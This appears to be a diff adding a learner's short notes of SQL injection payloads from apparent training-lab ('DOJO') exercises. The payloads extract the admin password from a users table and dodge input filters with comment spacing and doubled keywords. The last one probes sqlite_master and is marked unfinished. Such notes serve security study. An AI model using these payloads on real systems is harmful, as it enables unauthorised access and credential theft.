@@ -1,0 +1,15 @@
+Insert : 
+
+', (SELECT password FROM users WHERE username = 'admin')) --
+
+Filter bypass :
+
+'union/**/select/**/username,ppasswordassword/**/from/**/users/**/where/**/username='admin'--
+
+DOJO #1 :
+
+admin') UNION SELECT password from users WHERE (username LIKE 'admin
+
+DOJO #2 :
+
+admin' AND (SELselectECT null FROM sqlite_master) AND ' (pas finis)
